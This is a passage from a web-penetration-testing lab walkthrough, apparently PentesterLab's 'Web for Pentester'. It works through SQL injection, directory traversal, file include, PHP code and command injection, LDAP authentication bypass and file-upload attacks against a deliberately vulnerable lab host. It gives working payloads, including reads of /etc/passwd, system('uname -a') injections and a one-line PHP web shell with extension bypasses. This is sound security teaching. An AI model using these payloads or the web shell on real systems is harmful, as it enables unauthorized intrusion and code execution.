<li>?name=root’ and ‘1’=’1’ # (don’t forget to encode #): the quote in the initial query will be commented out.</li>
<li>?name=root’ and 1=1 # (don’t forget to encode #): the quote in the initial query will be commented out and we don’t need the ‘ in ‘1’=’1’.</li>
<li>?name=root’ # (don’t forget to encode #): the quote in the initial query will be commented out and we don’t need the 1=1.</li>
</ul>
</blockquote>
<p>Now these requests may not return the same thing:</p>
<blockquote>
<ul>
<li>?name=root’ and ‘1’=’0: the quote in the initial query will close the one at the end of our injection. The page should not return any result (empty table), since the selection criteria always returns false.</li>
<li>?name=root’ and ‘1’=’1 # (don’t forget to encode #): the quote in the initial query will be commented out. We should have the same result as the query above.</li>
<li>?name=root’ or ‘1’=’1: the quote in the initial query will close the one at the end of our injection. or will select all results, with the second part being always true. It may give the same result, but it’s unlikely, since the value is used as a filter for this example (as opposed to a page only showing one result at a time).</li>
<li>?name=root’ or ‘1’=’1’ # (don’t forget to encode #): the quote in the initial query will be commented out. We should have the same result as the query above.</li>
</ul>
</blockquote>
<p>With all these tests, we can be sure that we have a SQL injection. This training only focuses on detection. You can look into other PentesterLab training, and learn how to exploit this type of issues.</p>
<h3 id="Example_2-1">Example 2</h3><p>In this example, the error message gives away the protection created by the developer: ERROR NO SPACE. This error message appears as soon as a space is injected inside the request. It prevents us from using the ‘ and ‘1’=’1 method, or any fingerprinting that use the space character. However, this filtering is easily bypassed, using tabulation (HT or \t). You will need to use encoding, to use it inside the HTTP request. Using this simple bypass, you should be able to see how to detect this vulnerability.</p>
<h3 id="Example_3-1">Example 3</h3><p>In this example, the developer blocks spaces and tabulations. There is a way to bypass this filter. You can use comments between the keywords to build a valid request without any space or tabulation. The following SQL comments can be used: /**/. By replacing all space/tabulation in the previous examples using this comment, you should be able to test for this vulnerability.</p>
<h3 id="Example_4-1">Example 4</h3><p>This example represents a typical mis-understanding of how to protect against SQL injection. In the 3 previous examples, using the function mysql_real_escape_string would have prevented the vulnerability. In this example, the developer used the same logic. However, the value used is an integer and is not echoed between single quote ‘. Since the value is directly put in the query, using mysql_real_escape_string does not prevent anything. Here, you only need to be able to add spaces and SQL keywords to break the syntax. The detection method is really similar to the one used for string-based SQL injection. You just don’t need the quote at the beginning of the payload.</p>
<p>Another method to detect this is to play with the integer. The initial request is &gt;* ?id=2. By playing with the value 2, we can detect the SQL injection:</p>
<blockquote>
<ul>
<li>?id=2 # (# needs to be encoded) should return the same thing.</li>
<li>?id=3-1 should return the same thing. The database will automatically perform the subtraction and you will get the same result.</li>
<li>?id=2-0 should return the same thing.</li>
<li>?id=1+1 (+ needs to be encoded) should return the same thing. The database will automatically perform the addition and you will get the same result.</li>
<li>?id=2.0 should return the same thing.</li>
</ul>
</blockquote>
<p>And the following should not return the same results:</p>
<blockquote>
<ul>
<li>?id=2+1.</li>
<li>?id=3-0.</li>
</ul>
</blockquote>
<h3 id="Example_5-1">Example 5</h3><p>This example is really similar to the previous, detection-wise. If you look into the code, you will see that the developer tried to prevent SQL injection by using a regular expression:<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/^[0-9]+/'</span>, <span class="variable">$_GET</span>[<span class="string">"id"</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"ERROR INTEGER REQUIRED"</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>However, the regular expression used is incorrect; it only ensures that the parameter id starts with a digit. The detection method used previously can be used to detect this vulnerability.</p>
<h3 id="Example_6-1">Example 6</h3><p>This example is the other way around. The developer did a mistake in the regular expression again:<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/[0-9]+$/'</span>, <span class="variable">$_GET</span>[<span class="string">"id"</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"ERROR INTEGER REQUIRED"</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>This regular expression only ensures that the parameter id ends with a digit (thanks to the $ sign). It does not ensure that the beginning of the parameter is valid (missing ^). You can use the methods learnt previously. You just need to add an integer at the end of your payload. This digit can be part of the payload or placed after a SQL comment: 1 or 1=1 # 123.</p>
<h3 id="Example_7-1">Example 7</h3><p>Another and last example of bad regular expression:<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/^-?[0-9]+$/m'</span>, <span class="variable">$_GET</span>[<span class="string">"id"</span>])) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"ERROR INTEGER REQUIRED"</span>);    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Here we can see that the beginning (^) and end ($) of the string are correctly checked. However, the regular expression contains the modifier PCRE_MULTILINE (/m). The multine modifier will only validate that one of the lines is only containing an integer, and the following values will therefore be valid (thanks to the new line in them):</p>
<blockquote>
<ul>
<li>123\nPAYLOAD;</li>
<li>PAYLOAD\n123;</li>
<li>PAYLOAD\n123\nPAYLOAD.</li>
</ul>
</blockquote>
<p>These values need to be encoded when used in a URL, but with the use of encoding and the techniques seen previously you should be able to detect this vulnerability.</p>
<h3 id="Example_8-1">Example 8</h3><p>In this example, the parameter name gives away where it will get echoed in the SQL query. If you look into MySQL documentation, there are two ways to provide a value inside an ORDER BY statement:</p>
<blockquote>
<ul>
<li>directly: ORDER BY name ;</li>
<li>between back-ticks: ORDER BY <code>name</code>.</li>
</ul>
</blockquote>
<p>The ORDER BY statement cannot be used with value inside single quote ‘ or double quote “. If this is used, nothing will get sorted, since MySQL considers these as constants.</p>
<p>To detect this type of vulnerability, we can try to get the same result using different payloads:</p>
<blockquote>
<ul>
<li>name` # (# needs to be encoded) should give the same results.</li>
<li>name` ASC # (# needs to be encoded) should give the same results.</li>
<li>name<code>,</code>name: the back-tick in the initial query will close the one at the end of our injection.</li>
</ul>
</blockquote>
<p>And the following payloads should give different results:</p>
<blockquote>
<ul>
<li>name` DESC # (# needs to be encoded).</li>
<li>name` should not give any result, since the syntax is incorrect.</li>
</ul>
</blockquote>
<h3 id="Example_9-1">Example 9</h3><p>This example is similar to the previous one, but instead of back-tick ``</p>
<p>There are other methods that can be used in this case, since we are directly injecting in the request without a back-tick before. We can use the MySQL IF statement to generate more payloads:</p>
<blockquote>
<ul>
<li>IF(1, name,age) should give the same results.</li>
<li>IF(0, name,age) should give different results. You can see that the columns are sorted by age, but the sort function compares the values as strings, not as integers (10 is smaller than 2). This is a side effect of IF that will sort values as strings if one of the column contains a string.</li>
</ul>
</blockquote>
<h2 id="Directory_traversal">Directory traversal</h2><p>Directory traversals come from a lack of filtering/encoding of information used as part of a path by an application.</p>
<p>As with other vulnerabilities, you can use the “same value technique” to test for this type of issue. For example, if the path used by the application inside a parameter is /images/photo.jpg. You can try to access:</p>
<blockquote>
<ul>
<li>/images/./photo.jpg: you should see the same file.</li>
<li>/images/../photo.jpg: you should get an error.</li>
<li>/images/../images/photo.jpg: you should see the same file again.</li>
<li>/images/../IMAGES/photo.jpg: you should get an error (depending on the file system) or something weird is going on.</li>
</ul>
</blockquote>
<p>If you don’t have the value images and the legitimate path looks like photo.jpg, you will need to work out what the parent repository is.</p>
<p>Once you have tested that, you can try to retrieve other files. On Linux/Unix the most common test cases is the /etc/passwd. You can test: images/../../../../../../../../../../../etc/passwd, if you get the passwd file, the application is vulnerable. The good news is that you don’t need to know the number of ../. If you put too many, it will still work.</p>
<p>Another interesting thing to know is that if you have a directory traversal in Windows, you will be able to access test/../../../file.txt, even if the directory test does not exist. This is not the case, on Linux. This can be really useful where the code concatenates user-controlled data, to create a file name. For example, the following PHP code is supposed to add the parameter id to get a file name (example<em>1.txt for example). On Linux, you won’t be able to exploit this vulnerability if there is no directory starting by example</em>, whereas on Windows, you will be able to exploit it, even if there is no such directory.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="string">"/var/files/example_"</span>.<span class="variable">$_GET</span>[<span class="string">'id'</span>].<span class="string">".txt"</span>;</span><br></pre></td></tr></table></figure></p>
<p>In these exercises, the vulnerabilities are illustrated by a script used inside an &lt;img tag. You will need to read the HTML source (or use “Copy image URL”) to find the correct link, and start exploiting the issue.</p>
<h3 id="Example_1-2">Example 1</h3><p>The first example is a really simple directory traversal. You just need to go up in the file system, and then back down, to get any files you want. In this instance, you will be restricted by the file system permissions, and won’t be able to access /etc/shadow, for example.</p>
<p>In this example, based on the header sent by the server, your browser will display the content of the response. Sometimes the browser will send the response with a header Content-Disposition: attachment, and your browser will not display the file directly. You can open the file to see the content. This method will take you some time for every test.</p>
<p>Using a Linux/Unix system, you can do this more quickly, by using wget:<br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">% wget -O - <span class="string">'http://vulnerable/dirtrav/example1.php?file=../../../../../../../etc/passwd'</span></span><br><span class="line">[<span class="keyword">...</span>]</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:/bin:/bin/sh</span><br><span class="line">[<span class="keyword">...</span>]</span><br></pre></td></tr></table></figure></p>
<h3 id="Example_2-2">Example 2</h3><p>In this example, you can see that the full path is used to access the file. However, if you try to just replace it with /etc/passwd, you won’t get anything. It looks like a simple check is performed by the PHP code. You can however bypass it by keeping the beginning of the path and add your payload at the end, to go up and back down within the file system.</p>
<h3 id="Example_3-2">Example 3</h3><p>This example is based on a common problem when you exploit directory traversal: the server-side code adds its own suffix to your payload. This can be easily bypassed, by using a NULL BYTE (which you need to URL-encode as %00). Using NULL BYTE to get rid of any suffix added by the server-side code is a common bypass, and works really well in Perl and older versions of PHP.</p>
<p>In this code, the issue is simulated since PHP solved this type of bypass since the version <a href="http://php.net/releases/5_3_4.php" target="_blank" rel="external">5.3.4</a>.</p>
<h2 id="File_include">File include</h2><p>In a lot of applications, developers need to include files to load classes or to share some templates between multiple web pages.</p>
<p>File include vulnerabilities come from a lack of filtering when a user-controlled parameter is used as part of a file name in a call to an including function (require, require_once, include or include_once in PHP for example). If the call to one of these methods is vulnerable, an attacker will be able to manipulate the function to load his own code. File include vulnerabilities can also be used as a directory traversal to read arbitrary files. However, if the arbitrary code contains an opening PHP tag, the file will be interpreted as PHP code.</p>
<p>This including function can allow the loading of local resources or remote resource (a website, for example). If vulnerable, it will lead to:</p>
<blockquote>
<ul>
<li>Local File Include: LFI. A local file is read and interpreted.</li>
<li>Remote File Include: RFI. A remote file is retrieved and interpreted.</li>
</ul>
</blockquote>
<p>By default, PHP disables loading of remote files, thanks to the configuration option: allow_url_include. In the ISO, it has been enabled to allow you to test it.</p>
<h3 id="Example_1-3">Example 1</h3><p>In this first example, you can see an error message, as soon as you inject a special character (a quote, for example) into the parameter:<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: <span class="keyword">include</span>(intro.php'): failed to <span class="keyword">open</span> stream: <span class="keyword">No</span> such <span class="keyword">file</span> or directory <span class="keyword">in</span> /<span class="keyword">var</span>/www/fileincl/example1.php <span class="keyword">on</span> <span class="keyword">line</span> 7 Warning: <span class="keyword">include</span>(): Failed opening 'intro.php'' <span class="keyword">for</span> inclusion (include_path='.:/usr/share/php:/usr/share/pear') <span class="keyword">in</span> /<span class="keyword">var</span>/www/fileincl/example1.php <span class="keyword">on</span> <span class="keyword">line</span> 7</span><br></pre></td></tr></table></figure></p>
<p>If you read the error message carefully, you can extract a lot of information:</p>
<blockquote>
<ul>
<li>The path of the script: /var/www/fileincl/example1.php.</li>
<li>The function used: include().</li>
<li>The value used in the call to include is the value we injected intro.php’ without any addition or filtering.</li>
</ul>
</blockquote>
<p>We can use the methods used to detect directory traversal, to detect file include. For example, you can try to include /etc/passwd by using the ../ technique.</p>
<p>We can test for Remote File Include, by requesting an external resource: <a href="https://pentesterlab.com/" target="_blank" rel="external">https://pentesterlab.com/</a>. We will see that the page from PentesterLab gets included inside the current page.</p>
<p>PentesterLab’s website also contains a test for this type of vulnerability. If you use the URL <a href="https://pentesterlab.com/test_include.txt" target="_blank" rel="external">https://pentesterlab.com/test_include.txt</a>. You should get the result of the function phpinfo() within the current page.</p>
<h3 id="Example_2-3">Example 2</h3><p>In a similar manner to directory traversal, this example adds its own suffix to the value provided. As before, you can get rid of the suffix (for LFI) using a NULL BYTE. For RFI, you can get rid of the suffix, by adding &amp;blah= or ?blah= depending on your URL.</p>
<p>In this exercise, the code simulates the behaviour of older versions of PHP. PHP now correctly handles paths and they cannot be poisoned using a NULL BYTE, as they used to.</p>
<p>In this code, the issue is simulated, since PHP solved this type of bypass since the version (5.3.4)[<a href="http://php.net/releases/5_3_4.php" target="_blank" rel="external">http://php.net/releases/5_3_4.php</a>].</p>
<h2 id="Code_injection">Code injection</h2><p>In this section, we are going to work on code execution. Code executions come from a lack of filtering and/or escaping of user-controlled data. When you are exploiting a code injection, you will need to inject code within the information you are sending to the application. For example, if you want to run the command ls, you will need to send system(“ls”) to the application since it is a PHP application.</p>
<p>Just like other examples of web application issues, it’s always handy to know how to comment out the rest of the code (i.e.: the suffix that the application will add to the user-controlled data). In PHP, you can use // to get rid of the code added by the application.</p>
<p>As with SQL injection, you can use the same value technique to test and ensure you have a code injection:</p>
<blockquote>
<ul>
<li>By using comments and injecting /<em> random value </em>/.</li>
<li>By injecting a simple concatenation “.” (where “ are used to break the syntax and reform it correctly).</li>
<li>By replacing the parameter you provided by a string concatenation, for example “.”ha”.”cker”.” instead of hacker.</li>
</ul>
</blockquote>
<p>You can also use time-based detection for this issue by using the PHP function sleep. You will see a time difference between:</p>
<blockquote>
<ul>
<li>Not using the function sleep or calling it with a delay of zero: sleep(0).</li>
<li>A call to the function with a long delay: sleep(10).</li>
</ul>
</blockquote>
<h3 id="Example_1-4">Example 1</h3><p>This first example is a trivial code injection. If you inject a single quote, nothing happens. However, you can get a better idea of the problem by injecting a double quote:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Parse error: syntax error, unexpected <span class="string">'!'</span>, expecting <span class="string">','</span> or <span class="string">';'</span> <span class="keyword">in</span> /var/www/codeexec/example1.<span class="function"><span class="title">php</span><span class="params">(<span class="number">6</span>)</span></span> : <span class="function"><span class="title">eval</span><span class="params">()</span></span><span class="string">'d code on line 1</span></span><br></pre></td></tr></table></figure></p>
<p>This could be the other way around; the single quote could generate an error where the double quote may not.</p>
<p>Based on the error message, we can see that the code is using the function eval: “Eval is evil…”.</p>
<p>We saw that the double quote breaks the syntax, and that the function eval seems to be using our input. From this, we can try to work out payloads that will give us the same results:</p>
<blockquote>
<ul>
<li>“.”: we are just adding a string concatenation; this should give us the same value.</li>
<li>“./<em>pentesterlab</em>/“: we are just adding a string concatenation and information inside comments; this should give us the same value.</li>
</ul>
</blockquote>
<p>Now that we have similar values working, we need to inject code. To show that we can execute code, we can try to run a command (for example uname -a using the code execution). The full PHP code looks like:<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system<span class="comment">('uname -a')</span>;</span><br></pre></td></tr></table></figure></p>
<p>The challenge here is to break out of the code syntax and keep a clean syntax. There are many ways to do it:</p>
<blockquote>
<ul>
<li>By adding dummy code: “.system(‘uname -a’); $dummy=”.</li>
<li>By using comment: “.system(‘uname -a’);# or “.system(‘uname -a’);//.</li>
</ul>
</blockquote>
<p>Don’t forget that you will need to URL-encode some of the characters (# and ;) before sending the request.</p>
<h3 id="Example_2-4">Example 2</h3><p>When ordering information, developers use two methods:</p>
<blockquote>
<ul>
<li>order by in a SQL request;</li>
<li>usort in PHP code.</li>
</ul>
</blockquote>
<p>The function usort is often used with the function create_function to dynamically generate the “sorting” function, based on user-controlled information. If the web application lacks potent filtering and validation, this can lead to code execution.</p>
<p>By injecting a single quote, we can get an idea of what is going on:<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Parse</span> <span class="keyword">error</span>: <span class="keyword">syntax</span> <span class="keyword">error</span>, unexpected T_CONSTANT_ENCAPSED_STRING <span class="keyword">in</span> /<span class="keyword">var</span>/www/codeexec/example2.php(22) : runtime-created function <span class="keyword">on</span> <span class="keyword">line</span> 1 Warning: usort() expects parameter 2 to be a valid callback, <span class="keyword">no</span> array or string given <span class="keyword">in</span> /<span class="keyword">var</span>/www/codeexec/example2.php <span class="keyword">on</span> <span class="keyword">line</span> 22</span><br></pre></td></tr></table></figure></p>
<p>The source code of the function looks like the following:<br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ZEND_FUNCTION(create_function)</span><br><span class="line">&#123;</span><br><span class="line">  [<span class="keyword">...</span>]</span><br><span class="line">    eval_code = (char *) emalloc(eval_code_length);</span><br><span class="line">    sprintf(eval_code, <span class="string">"function "</span> LAMBDA_TEMP_FUNCNAME <span class="string">"(%s)&#123;%s&#125;"</span>, Z_STRVAL_PP(z_function_args), Z_STRVAL_PP(z_function_code));</span><br><span class="line"></span><br><span class="line">    eval_name = zend_make_compiled_string_description(<span class="string">"runtime-created function"</span> TSRMLS_CC);</span><br><span class="line">    retval = zend_eval_string(eval_code, <span class="literal">NULL</span>, eval_name TSRMLS_CC);</span><br><span class="line">  [<span class="keyword">...</span>]</span><br></pre></td></tr></table></figure></p>
<p>We can see that the code that will be evaluated is put inside curly brackets {…}, and we will need this information to correctly finish the syntax, after our injection.</p>
<p>As opposed to the previous code injection, here, you are not injecting inside single or double quotes. We know that we need to close the statement with } and comment out the rest of the code using // or # (with encoding). We can try poking around with:</p>
<blockquote>
<ul>
<li>?order=id;}//: we get an error message (Parse error: syntax error, unexpected ‘;’). We are probably missing one or more brackets.</li>
<li>?order=id);}//: we get a warning. That seems about right.</li>
<li>?order=id));}//: we get an error message (Parse error: syntax error, unexpected ‘)’ i). We probably have too many closing brackets.</li>
</ul>
</blockquote>
<p>Since we now know how to finish the code correctly (a warning does not stop the execution flow), we can inject arbitrary code and gain code execution using ?order=id);}system(‘uname%20-a’);// for example.</p>
<h3 id="Example_3-3">Example 3</h3><p>We talked earlier about regular expression modifiers with multi-line regular expression. Another very dangerous modifier exists in PHP: PCRE_REPLACE_EVAL (/e). This modifier will cause the function preg_replace to evaluate the new value as PHP code, before performing the substitution.</p>
<p><code>PCRE_REPLACE_EVAL</code> has been deprecated as of PHP 5.5.0<br>Here, you will need to change the pattern, by adding the /e modifier. Once you have added this modifier, you should get a notice:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Notice: <span class="operator"><span class="keyword">Use</span> <span class="keyword">of</span> undefined constant hacker - assumed <span class="string">'hacker'</span> <span class="keyword">in</span> /<span class="keyword">var</span>/www/codeexec/example3.php(<span class="number">3</span>) : <span class="keyword">regexp</span> code <span class="keyword">on</span> line <span class="number">1</span></span></span><br></pre></td></tr></table></figure></p>
<p>The function preg_replace tries to evaluate the value hacker as a constant but it’s not defined, and you get this message.</p>
<p>You can easily replace hacker with a call to the function phpinfo() to get a visible result. Once you can see the result of the phpinfo function, you can use the function system to run any command.</p>
<h3 id="Example_4-2">Example 4</h3><p>This example is based on the function assert. When used incorrectly, this function will evaluate the value received. This behaviour can be used to gain code execution.<br>By injecting a single quote or double quote (depending on the way the string was declared), we can see an error message indicating that PHP tried to evaluate the code:<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Parse</span> <span class="keyword">error</span>: <span class="keyword">syntax</span> <span class="keyword">error</span>, unexpected T_ENCAPSED_AND_WHITESPACE <span class="keyword">in</span> /<span class="keyword">var</span>/www/codeexec/example4.php(4) : <span class="keyword">assert</span> code <span class="keyword">on</span> <span class="keyword">line</span> 1 Catchable fatal <span class="keyword">error</span>: <span class="keyword">assert</span>(): Failure evaluating code: 'hacker'' <span class="keyword">in</span> /<span class="keyword">var</span>/www/codeexec/example4.php <span class="keyword">on</span> <span class="keyword">line</span> 4</span><br></pre></td></tr></table></figure></p>
<p>Once we broke the syntax, we need to try to reconstruct it correctly. We can try the following: hacker’.’. The error message disappeared.</p>
<p>Now that we know how to finish the syntax to avoid errors, we can just inject our payload to run the function phpinfo(): hacker’.phpinfo().’ and we get the configuration of the PHP engine in the page.</p>
<h2 id="Command_injection">Command injection</h2><p>Command injection comes from a lack of filtering and encoding of information used as part of a command. The simplest example comes from using the function system (to run commands) and take an HTTP parameter as an argument of this command.</p>
<p>There are many ways to exploit a command injection:</p>
<blockquote>
<ul>
<li>By injecting the command inside backticks, for example <code>id</code></li>
<li>By redirecting the result of the first command into the second | id</li>
<li>By running another command if the first one succeeds: &amp;&amp; id (where &amp; needs to be encoded)</li>
<li>By running another command if the first one fails (and making sure it does: error || id (where error is just here to cause an error).<br>It’s also possible to use the same value technique to perform this type of detection. For example, you can replace 123 with <code>echo 123</code>. The command inside backticks will be executed first, and return exactly the same value to be used by the command.</li>
</ul>
</blockquote>
<p>You can also use time-based vectors to detect these kinds of vulnerabilities. You can use a command that will take time to process on the server (with a risk of denial of service). You can also use the command sleep to tell the server to wait a certain amount of time before continuing. For example, using sleep 10.</p>
<h3 id="Example_1-5">Example 1</h3><p>The first example is a trivial command injection. The developer didn’t perform any input validation, and you can directly inject your commands after the ip parameter.</p>
<p>Based on the techniques seen above, you can for example, use the payload &amp;&amp; cat /etc/passwd (with encoding) to see the content of /etc/passwd.</p>
<h3 id="Example_2-5">Example 2</h3><p>This example validates the parameter provided, but does so incorrectly. As we saw before with the SQL injection, the regular expression used is multi-line. Using the same technique we saw for the SQL injection, you can easily gain code execution.</p>
<p>The good thing here is that you don’t even need to inject a separator. You can just add the encoded new line (%0a) and then put your command.</p>
<h3 id="Example_3-4">Example 3</h3><p>This example is really similar to the previous one; the only difference is that the developer does not stop the script correctly. In PHP, an easy and simple way to redirect users if one of the value provided doesn’t match some security constraint is to call the function header. However, even if the browser will get redirected, this function does not stop the execution flow, and the script will still finish to run with the dangerous parameter. The developer needs to call the function die after the call to the function header, to avoid this issue.</p>
<p>You cannot easily exploit this vulnerability in your browser, since your browser will follow the redirect, and will not display the redirecting page. To exploit this issue you can use telnet:<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% telnet vulnerable <span class="number">80</span> </span><br><span class="line">GET /commandexec/example3.php?ip=<span class="number">127.0</span>.<span class="number">0.1</span><span class="string">|uname+-a HTTP/1.0</span></span><br></pre></td></tr></table></figure></p>
<p>or using netcat:<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">% echo <span class="string">"GET /commandexec/example3.php?ip=127.0.0.1|uname+-a HTTP/1.0\r\n"</span> | nc vulnerable <span class="number">80</span></span><br></pre></td></tr></table></figure></p>
<p>If you look carefully at the response, you will see that you get a 302 redirect, but you can see the result of the command uname -a in the body of the response.</p>
<h2 id="LDAP_attacks">LDAP attacks</h2><p>In this section, we will cover LDAP attacks. LDAP is often used as a backend for authentication, especially in Single-Sign-On (SSO) solutions. LDAP has its own syntax that we will see in more detail, in the following examples.</p>
<h3 id="Example_1-6">Example 1</h3><p>In this first example, you connect to a LDAP server, using your username and password. In this instance, The LDAP server does not authenticate you, since your credentials are invalid.</p>
<p>However, some LDAP servers authorise NULL Bind: if null values are sent, the LDAP server will proceed to bind the connection, and the PHP code will think that the credentials are correct. To get the bind with 2 null values, you will need to completely remove this parameter from the query. If you keep something like username=&amp;password= in the URL, these values will not work, since they won’t be null; instead, they will be empty.</p>
<p>This is an important check to perform on all login forms that you will test in the future, even if the backend is not LDAP-based.</p>
<h3 id="Example_2-6">Example 2</h3><p>The most common pattern of LDAP injection is to be able to inject in a filter. Here, we will see how you can use LDAP injection to bypass an authentication check.</p>
<p>First, you need to learn a bit of LDAP syntax. When you are retrieving a user, based on its username, the following will be used:<br><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="list">(<span class="keyword">cn=</span><span class="collection">[INPUT]</span>)</span></span><br></pre></td></tr></table></figure></p>
<p>If you want to add more conditions and some boolean logic, you can use:<br><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A <span class="built_in">boolean</span> <span class="keyword">OR</span> <span class="keyword">using</span> |: (|(cn=[INPUT1])(cn=[INPUT2])) <span class="keyword">to</span> <span class="keyword">get</span> records matching [INPUT1] <span class="keyword">or</span> [INPUT2].</span><br><span class="line">A <span class="built_in">boolean</span> <span class="keyword">AND</span> <span class="keyword">using</span> &amp;: (&amp;(cn=[INPUT1])(userPassword=[INPUT2])) <span class="keyword">to</span> <span class="keyword">get</span> records <span class="keyword">for</span> which the cn matches [INPUT1] <span class="keyword">and</span> the password matches [INPUT2].</span><br></pre></td></tr></table></figure></p>
<p>As you can see, the boolean logic is located at the beginning of the filter. Since you’re likely to inject after it, it’s not always possible (depending on the LDAP server) to inject logic inside the filter, if it’s just (cn=[INPUT]).</p>
<p>LDAP uses the wildcard <em> character very often, to match any values. This can be used for match everything </em> or just substrings (for example, adm* for all words starting with adm).</p>
<p>As with other injections, we will need to remove anything added by the server-side code. We can get rid of the end of the filter, using a NULL BYTE (encoded as %00).</p>
<p>Here, we have a login script. We can see that if we use:</p>
<blockquote>
<ul>
<li>username=hacker&amp;password=hacker we get authenticated (this is the normal request).</li>
<li>username=hack*&amp;password=hacker we get authenticated (the wildcard matches the same value).</li>
<li>username=hacker&amp;password=hac* we don’t get authenticated (the password may likely be hashed).</li>
</ul>
</blockquote>
<p>Now, we will see how we can use the LDAP injection, in the username parameter to bypass the authentication. Based on our previous tests, we can deduce that the filter probably looks like:<br><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="list">(<span class="keyword">&amp;</span><span class="list">(<span class="keyword">cn=</span><span class="collection">[INPUT1]</span>)</span><span class="list">(<span class="keyword">userPassword=HASH</span><span class="collection">[INPUT2]</span>)</span>)</span></span><br></pre></td></tr></table></figure></p>
<p>Where HASH is an unsalted hash (probably MD5 or SHA1).</p>
<p>LDAP supports several formats: <code>{CLEARTEXT}</code>, <code>{MD5}</code>, <code>{SMD5}</code> (salted MD5), <code>{SHA}</code>, <code>{SSHA}</code> (salted SHA1), <code>{CRYPT}</code> for storing passwords’.<br>Since [INPUT2] is hashed, we cannot use it to inject our payload.</p>
<p>Our goal here will be to inject inside [INPUT1] (the username parameter). We will need to inject:</p>
<blockquote>
<ul>
<li>The end of the current filter using hacker).</li>
<li>An always-true condition ((cn=*) for example)</li>
<li>A ) to keep a valid syntax and close the first ).</li>
<li>A NULL BYTE (%00) to get rid of the end of the filter.</li>
</ul>
</blockquote>
<p>Once you put this together, you should be able to login as hacker with any password. You can then try to find other users using the wildcard trick. For example, you can use a* in the first part of the filter, and check who you are logged in as.</p>
<p>In most cases, LDAP injection will allow only you to bypass authentication and authorisation checks. Retrieving arbitrary data (as opposed to just getting more results) is often really challenging or impossible.</p>
<h2 id="Upload">Upload</h2><p>In this section, we will cover how to use file upload functionalities to gain code execution.</p>
<p>In web applications (especially the ones using the file systems to determine what code should be run), you can get code execution on a server, if you manage to upload a file with the right filename (often depending on the extension). In this section, we will see the basics of these types of attacks.</p>
<p>First, since we are working on a PHP application, we will need a PHP web shell. A web shell is just a simple script or web application that runs the code or commands provided. For example, in PHP, the following code is a really simple web shell:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line">  system(<span class="variable">$_GET</span>[<span class="string">"cmd"</span>]);</span><br><span class="line"><span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>More complex web shells can perform advanced operations, such as providing database and file system access, or even TCP tunnelling.</p>
<h3 id="Example_1-7">Example 1</h3><p>The first example is a really basic upload form, with no restriction. By using the web shell above, and naming it with a .php extension you should be able to get it upload onto the server. Once it’s uploaded, you can access the script (with the parameter cmd=uname for example) to get command execution.</p>
<h3 id="Example_2-7">Example 2</h3><p>In this second example, the developer put a restriction on the file name. The file name cannot end with .php. To bypass this restriction, you can use one of the following methods:</p>
<blockquote>
<ul>
<li>change the extension to .php3. On other systems, extensions like .php4 or .php5 may also work. It depends on the configuration of the web server.</li>
<li>use an extension that Apache does not know .blah after the extension .php. Since Apache does not know how to handle the extension .blah, it will move to the next one: .php and run the PHP code.</li>
